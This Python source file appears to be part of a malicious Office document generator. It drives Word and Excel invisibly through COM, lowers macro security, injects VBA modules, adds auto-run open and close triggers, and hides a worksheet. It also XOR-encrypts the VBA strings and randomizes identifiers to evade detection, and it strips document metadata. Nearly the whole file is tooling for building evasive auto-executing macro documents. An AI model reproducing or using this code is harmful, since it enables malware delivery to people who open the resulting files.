from ctypes import *

import pythoncom
import secrets
import re
import string
import win32com.client

from const import *


def random_value(size, chars=string.ascii_letters + string.digits):
    return ''.join(secrets.choice(chars) for _ in range(size))


class ExcelObject:
    def __init__(self, worksheet_name, cell_location):
        pythoncom.CoInitializeEx(pythoncom.COINIT_APARTMENTTHREADED)
        self.worksheet_name = worksheet_name
        self.cell_location = cell_location

        try:
            self.excel = win32com.client.Dispatch("Excel.Application")
        except:
            Info(
                "Cannot launch win32com.client.Dispatch(\"Excel.Application\"), "
                "check if word and pywin32 module are correctly installed",
                3)
        self.excel.Visible = 0
        self.excel.DisplayAlerts = 0

    def Open(self, sFilename):
        try:
            self.xls = self.excel.Workbooks.Open(sFilename)
        except:
            self.xls.Close(SaveChanges=0)
            self.Quit()
            Info("Cannot open " + sFilename + ", Please check the validity of the path or the filename", 3)

    def CreateNewTab(self):
        try:
            self.Worksheets = self.xls.Worksheets.Add()
            self.Worksheets.Name = self.worksheet_name
            # noinspection PyStatementEffect
            self.Worksheets.Activate
            self.Worksheets.Range("" + self.cell_location + "").Value = ""
            self.Worksheets.Visible = 2
        except:
            self.xls.Close(SaveChanges=0)
            self.Quit()
            Info("Cannot create new hidden Worksheet, restart the script?", 3)

    def Save(self, sFilename=None, filetype=None):
        if sFilename:
            try:
                self.xls.SaveAs(sFilename + filetype)
            except:
                Info(
                    "Cannot save the file to " + sFilename + filetype +
                    " Please check the validity of the path or the filename.",
                    3)
                self.xls.Close(SaveChanges=0)
                self.Quit()
        else:
            self.xls.Save()

    def AddVba(self, vba, module_name=None):
        if module_name:
            try:
                self.vba_module = self.xls.VBProject.VBComponents.Add(1)
                self.vba_module.Name = module_name
                self.vba_module.CodeModule.AddFromString(vba)
            except:
                self.xls.Close(SaveChanges=0)
                self.Quit()
                Info(
                    "Can't create vba module " + module_name +
                    ", check if your template file is not modified, if your module name is OK "
                    "or if VBA Project object model is activated on macro options",
                    3)
        else:
            self.vba_active = self.xls.VBProject.VBComponents("ThisWorkbook").CodeModule
            self.vba_active.AddFromString(vba)

    def DeleteVbaModule(self, name):
        try:
            vba_module_todel = self.xls.VBProject.VBComponents(name)
            self.xls.VBProject.VBComponents.Remove(vba_module_todel)
        except:
            self.xls.Close(SaveChanges=0)
            self.Quit()
            Info("Can't delete vba module " + name + ", check if the module was successfully created before", 3)

    def RunMacro(self, macro_name):
        try:
            self.excel.Run(macro_name)
        except:
            self.xls.Close(SaveChanges=0)
            self.Quit()
            Info(
                "Can't run macro " + macro_name +
                ", check if the macro_name is ok, if the macro exists or if macro are activated in Word/excel",
                3)

    def Change_Macro_Settings(self):
        self.excel.AutomationSecurity = 3

    def Remove_Metadata(self):
        self.xls.RemoveDocumentInformation(99)
        self.xls.CustomDocumentProperties.Add("Info", False, 4,
                                              "8535297daa9f55f6c7e7e59af82908bb47eedc7d8a877b559211a0e25e71168e")

    def generate_trigger_function(self, vba_object, method):

        if method == "onClose":
            gen_fun = f"""Private Sub Workbook_Close()
			If ThisWorkbook.Sheets("{self.worksheet_name}").Range("{self.cell_location}") = "{trigger_close_test_value}" Then      
			ThisWorkbook.Sheets("{self.worksheet_name}").Range("{self.cell_location}") = "NOP"
			ActiveWorkbook.Save
			Else
			"""
        if method == "onOpen":
            gen_fun = "Private Sub Workbook_Open()\n"

        gen_fun += f"""If ThisWorkbook.Sheets("{self.worksheet_name}").Range("{self.cell_location}") <> "toto" Then
		{vba_object.rand_trigger_function_name}
		ThisWorkbook.Sheets("{self.worksheet_name}").Range("{self.cell_location}") = "toto"
		If ThisWorkbook.ReadOnly=False Then
		ActiveWorkbook.Save
		End If
		End If
		"""

        if method == "onClose":
            gen_fun += "\n End If\n"
        gen_fun += "End Sub\n"
        # gen_vba = vba_object.getCurrentVba() +"\n"+ gen_fun
        return gen_fun

    def Quit(self):
        self.excel.Quit()
        pythoncom.CoUninitialize()


class WordObject:
    def __init__(self):
        pythoncom.CoInitializeEx(pythoncom.COINIT_APARTMENTTHREADED)
        try:
            self.word = win32com.client.Dispatch("Word.Application")
        except:
            Info(
                "Cannot launch win32com.client.Dispatch(\"Word.Application\"), "
                "check if word and pywin32 module are correctly installed",
                3)

        self.word.Visible = 0

    def Open(self, sFilename):
        try:
            self.doc = self.word.Documents.Open(sFilename, False, False, False)
        except:
            self.Close()
            self.Quit()
            Info("Cannot open " + sFilename + ", Please check the validity of the path or the filename", 3)

    def CreateNew(self):
        self.doc = self.word.Documents.Add()  # create new doc

    def Save(self, sFilename=None, filetype=None):
        if sFilename:
            try:
                self.doc.SaveAs(sFilename + filetype)
            except:
                Info(
                    "Cannot save the file to " + sFilename + filetype +
                    " Please check the validity of the path or the filename.",
                    3)
                self.Close()
                self.Quit()
        else:
            self.doc.Save()

    def AddVba(self, vba, module_name=None):
        if module_name:
            try:
                self.vba_module = self.doc.VBproject.VBComponents.Add(1)
                self.vba_module.Name = module_name
                self.vba_module.CodeModule.AddFromString(vba)
            except:
                self.Close()
                self.Quit()
                Info(
                    "Can't create vba module " + module_name +
                    ", check if your template file is not modified, if your module name is OK "
                    "or if the VBA Project object model is activated on macro options",
                    3)
        else:
            self.vba_active = self.doc.VBproject.VBComponents("ThisDocument").CodeModule
            self.vba_active.AddFromString(vba)

    def DeleteVbaModule(self, name):
        try:
            vba_module_todel = self.doc.VBproject.VBComponents(name)
            self.doc.VBproject.VBComponents.Remove(vba_module_todel)
        except:
            self.Close()
            self.Quit()
            Info("Can't delete vba module " + name + ", check if the module was successfully created before", 3)

    def RunMacro(self, macro_name):
        try:
            self.word.Run(macro_name)
        except:
            self.Close()
            self.Quit()
            Info(
                "Can't run macro " + macro_name +
                ", check if the macro_name is ok, if the macro exists or if macro are activated in Word/excel",
                3)

    def Change_Macro_Settings(self):
        self.word.AutomationSecurity = 3

    def Remove_Metadata(self):
        self.doc.RemoveDocumentInformation(99)
        self.doc.CustomDocumentProperties.Add("Info", False, 4,
                                              "8535297daa9f55f6c7e7e59af82908bb47eedc7d8a877b559211a0e25e71168e")

    @staticmethod
    def generate_trigger_function(vba_object, method):

        if method == "onClose":
            gen_fun = f"""Private Sub Document_Close()
			If ActiveDocument.Variables("{trigger_close_test_name}").Value = "{trigger_close_test_value}" Then
			ActiveDocument.Variables("{trigger_close_test_name}").Value = "NOP"
			ActiveDocument.Save
			Else
			"""
        if method == "onOpen":
            gen_fun = "Private Sub Document_Open()\n"

        gen_fun += f"""If ActiveDocument.Variables("{vba_object.key_name}").Value <> "{trigger_close_test_name}" Then
		{vba_object.rand_trigger_function_name}
		ActiveDocument.Variables("{vba_object.key_name}").Value = "{trigger_close_test_name}"
		If ActiveDocument.ReadOnly=False Then
		ActiveDocument.Save
		End If
		End If
		"""

        if method == "onClose":
            gen_fun += "\n End If\n"
        gen_fun += "End Sub\n"
        # gen_vba = vba_object.getCurrentVba() +"\n"+ gen_fun
        return gen_fun

    def Close(self):
        self.doc.Close(SaveChanges=0)

    def Quit(self):
        self.word.Quit()
        # self.word.Quit()
        # os.system("taskkill /im WINWORD.exe")
        pythoncom.CoUninitialize()


class Enc_VBA_XOR:
    def __init__(self, vba_str, trigger_function_name, doc_type, worksheet_name, cell_location):
        self.key = random_value(encryption_key_length)
        self.xor_function_name = random_value(10, string.ascii_letters)
        # little trick to be sure the key will be stored at the end of the document
        self.key_name = random_value(1, 'wxyz') + random_value(5, string.ascii_letters)
        self.trigger_function_name = trigger_function_name
        self.vba = vba_str
        self.worksheet_name = worksheet_name
        self.cell_location = cell_location
        self.generate_xor_function(doc_type)
        self.n = 0

    def generate_xor_function(self, doc_type):
        if doc_type == ".doc":
            active_type = "ActiveDocument"
            active_subtype = "Variables"
            active_value = "Value()"

        elif doc_type == ".xls":
            active_type = "ThisWorkbook"
            active_subtype = "Sheets"
            active_value = "Range(\"" + self.cell_location + "\")"
            self.key_name = self.worksheet_name

        self.xor_function = """Private Function %(fun_name)s (%(text)s as Variant, %(begin)s as Integer )
		Dim %(temp)s, %(key_v)s As String, %(i)s, %(a)s
		%(key_v)s = %(active_type)s.%(active_subtype)s("%(key_name)s").%(active_value)s
		%(temp)s = ""
		%(i)s = 1
		While %(i)s < UBound(%(text)s) + 2
		%(a)s = %(i)s Mod Len(%(key_v)s): If %(a)s = 0 Then %(a)s = Len(%(key_v)s)
		%(temp)s = %(temp)s + chr(Asc(Mid(%(key_v)s,%(a)s+%(begin)s,1)) Xor CInt(%(text)s(%(i)s - 1)))
		%(i)s = %(i)s+1
		wend
		%(fun_name)s = %(temp)s
		End Function
		""" % {
            "fun_name": self.xor_function_name,
            "key_name": self.key_name,
            "active_type": active_type,
            "active_subtype": active_subtype,
            "active_value": active_value,
            "text": random_value(10, string.ascii_letters),
            "begin": random_value(10, string.ascii_letters),
            "temp": random_value(10, string.ascii_letters),
            "key_v": random_value(10, string.ascii_letters),
            "i": random_value(10, string.ascii_letters),
            "a": random_value(10, string.ascii_letters),
            "temp": random_value(10, string.ascii_letters),
        }

    def randomize_var(self):  # could be used in other objects
        var_names = list(set(re.findall(regex_rand_var, self.vba)))  # Get all variable name to Change
        self.vba = re.sub(regex_rand_del, '', self.vba)  # Delete markers
        for var_len, var in var_names:
            temp = random_value(int(var_len), string.ascii_letters)
            self.vba = re.sub(r"\b" + var + r"\b", temp, self.vba)  # Randomize variable names
            if var == self.trigger_function_name:
                self.rand_trigger_function_name = temp

        if hasattr(self, "rand_trigger_function_name"):
            Info("Randomized trigger function name : " + self.rand_trigger_function_name, 0, 3)
        else:
            raise Info(
                " The trigger function name " + self.trigger_function_name +
                " has not been found in the vba, triggering point cannot be set",
                3)

    def obfuscate_string(self):
        vba_strings = list(set(re.findall(regex_defaut_string, self.vba)))
        for strings in vba_strings:
            ciphered_string = ""
            if exclude_mark not in strings and strings != "":
                # Replace consecutive quotes by a simple one
                # (consecutive quote are used in VBA as escape char, we need to delete in ciphered_string)
                strings_parsed = strings.replace('""', '"')
                for i in range(len(strings_parsed)):
                    ciphered_string += str((ord(strings_parsed[i]) ^ ord(self.key[self.n + i]))) + ","
                    if i % 20 == 0 and i != 0 and i != len(strings_parsed) - 1:
                        ciphered_string += " _ \n"
                ciphered_string = ciphered_string[:-1]
                # replace only VBA Strings, avoid replacing code in function for example.
                self.vba = self.vba.replace("\"" + strings + "\"",
                                            self.xor_function_name + " ( Array ( " + ciphered_string + " ), " + str(
                                                self.n) + " )")
                self.n += len(strings)
        self.vba = re.sub(regex_exclude_string_del, '', self.vba)
        self.vba = self.xor_function + self.vba

    def hide_string(self):
        hide_string = list(set(re.findall(regex_string_to_hide, self.vba)))
        for var_name in hide_string:
            ciphered_string = ""
            if var_name in string_to_hide:
                strings = string_to_hide[var_name]
                for i in range(len(strings)):
                    ciphered_string += str((ord(strings[i]) ^ ord(self.key[self.n + i]))) + ","
                    if i % 20 == 0 and i != 0 and i != len(strings) - 1:
                        ciphered_string += " _ \n"
                ciphered_string = ciphered_string[:-1]
                self.vba = re.sub(regex_string_to_hide_find.replace(variable_name_ex, var_name),
                                  self.xor_function_name + " ( Array ( " + ciphered_string + " ), " + str(
                                      self.n) + " )",
                                  self.vba)  # replace only VBA Strings, avoid replacing code in function for example.
                self.n += len(strings)
            else:
                self.vba = re.sub(regex_string_to_hide_find.replace(variable_name_ex, var_name), '\"\"',
                                  self.vba)  # replace only VBA Strings, avoid replacing code in function for example.
                Info("Variable " + var_name + " not in dic string_to_hide, marker has been replaced by empty string", 2,
                     3)

    def getCurrentVba(self):
        return self.vba


class VBA_Functions:
    def __init__(self, doc_type, worksheet_name=None, cell_location=None):
        self.doc_type = doc_type
        self.worksheet_name = worksheet_name
        self.cell_location = cell_location

    def generate_generic_store_function(self, macro_name, variable_name, variable_value):
        set_var = self.format_long_string(variable_value, "tmp")
        if self.doc_type == ".doc":
            gen_vba = f"""
			Sub {macro_name}()
			{set_var}
			ActiveDocument.Variables.Add Name:="{variable_name}", Value:={"tmp"}
			End Sub
			"""
        elif self.doc_type == ".xls":
            gen_vba = f"""
			Sub {macro_name}()
			{set_var}
			ThisWorkbook.Sheets("{self.worksheet_name}").Range("{self.cell_location}") = {"tmp"}
			End Sub
			"""
        return gen_vba

    @staticmethod
    def format_long_string(long_string, str_name):
        tmp = "Dim " + str_name + " as String\r\n"
        tmp += str_name + " = \"\"\r\n"
        tmp += str_name + "=" + str_name + " & \""

        for i in range(len(long_string)):
            tmp += long_string[i]
            if i % 100 == 0 and i != 0 and i != len(long_string) - 1:
                tmp += "\" \n"
                tmp += str_name + " = " + str_name + " & \""
        if i % 100 != 0:
            tmp += "\" \n"
        return tmp

    @staticmethod
    def remove_style(vba):
        cleared_vba = ""
        for l in vba.splitlines():
            if l.lstrip():
                cleared_vba += l.lstrip() + "\n"
        vba = cleared_vba
        return vba


class Info(Exception):
    def __init__(self, reason, level, tab=1):
        self.STD_OUTPUT_HANDLE_ID = c_ulong(0xfffffff5)
        self.std_output_hdl = windll.Kernel32.GetStdHandle(self.STD_OUTPUT_HANDLE_ID)
        windll.Kernel32.GetStdHandle.restype = c_ulong
        if level == 3:
            windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 12)
            print("[x] " + reason)
            windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 7)
            exit()
        elif level == 2:
            if error_level == 2 or 3:
                windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 14)
                err = ""
                for i in range(tab):
                    err += "\t"
                print(err + "[!] " + reason)
                windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 7)
        elif level == 1:
            windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 10)
            err = ""
            for i in range(tab):
                err += "\t"
            print(err + "[*] " + reason)
            windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 7)
        elif level == 0:
            if error_level == 3:
                err = ""
                for i in range(tab):
                    err += "\t"
                print(err + "[+] " + reason)
